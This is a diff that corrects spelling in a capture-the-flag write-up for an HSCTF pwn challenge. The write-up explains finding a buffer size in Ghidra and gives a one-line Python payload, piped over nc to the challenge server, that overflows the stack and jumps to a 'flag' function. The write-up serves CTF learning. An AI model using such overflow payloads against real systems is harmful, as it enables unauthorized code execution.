@@ -11,11 +11,11 @@ Note, if you're having trouble getting it to work remotely:
 
 ## Solution
 
-Disassemble the bin file using ghidra and check the buffer dimension: it is 208 locally (216 to cause a buffer overflow, + 8 byte func_address to call the function) and 200 on server (208 to cause a buffer overflow, + 8 byte func_address to call the function). You'll notice that if you send 220 "a" as input, the program will try to call a function at the address: "0x7f0061616161" (character "a" in ASCII is equal to 0x61 in hex).
+Disassemble the bin file using Ghidra and check the buffer dimension: it is 208 locally (216 to cause a buffer overflow, + 8 byte func_address to call the function) and 200 on server (208 to cause a buffer overflow, + 8 byte func_address to call the function). You'll notice that if you send 220 "a" as input, the program will try to call a function at the address: "0x7f0061616161" (character "a" in ASCII is equal to 0x61 in hex).
 So just use the command:
 
 ```
 python -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd5\x11\x40\x00\x00\x00\x00\x00'" | nc pwn.hsctf.com 5002
 ```
 
-This will cause a bufferoverflow and make the program run the function "flag" (address 0x04011d5) to get the flag.txt from the server.
+This will cause a buffer overflow and make the program run the function "flag" (address 0x04011d5) to get the flag.txt from the server.
